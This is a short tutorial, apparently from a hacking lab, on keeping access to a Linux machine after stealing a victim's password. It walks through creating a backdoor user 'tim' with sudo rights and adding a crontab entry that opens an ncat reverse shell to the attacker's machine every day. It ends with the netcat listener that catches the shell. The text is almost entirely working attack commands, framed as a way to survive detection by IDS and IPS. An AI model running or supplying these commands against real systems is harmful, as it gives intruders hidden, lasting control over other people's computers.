## After gaining the victims password, we need to establish a redundant connection back to the attackers machine in case the attacker is caught in
their act. This will be pulled off using a file within linux called crontab which is used to schedule jobs like commands and shell scripts. 
This is a crucial part of hackers methods because often times these connections may be picked up and terminated by software like IDS and IPS. ##

## First, create an user named tim, add tim to the sudoers group, and then login to tim: ##

sudo adduser tim 
*enter password*
*skip extra details*

sudo usermod -aG sudo tim

su tim
*enter tim password*

## Now the attacker has switched to the account they created named 'tim' who has full sudo privileges. Next, the attacker will inject a command 
to be ran in crontab on the victims machine. This command will initate a reverse shell connection back to the attackers machine at a certain time: ##

(crontab -l ; echo "30 15 * * * ncat -e /bin/bash 192.168.56.102 4343")| crontab -

## This crontab will execute on the 30th minute of the 15th hour of every day, every week, and every month. (or 3:30pm every day). The command being
executed within the crontab will intiate the reverse shell connection back to the attackers machine on port 4343. ##

## In case of a lost connection to the victims machine, the attacker will only have to run a netcat listener on their machine to re-establish a 
connection: ##

nc -nlvp 4343
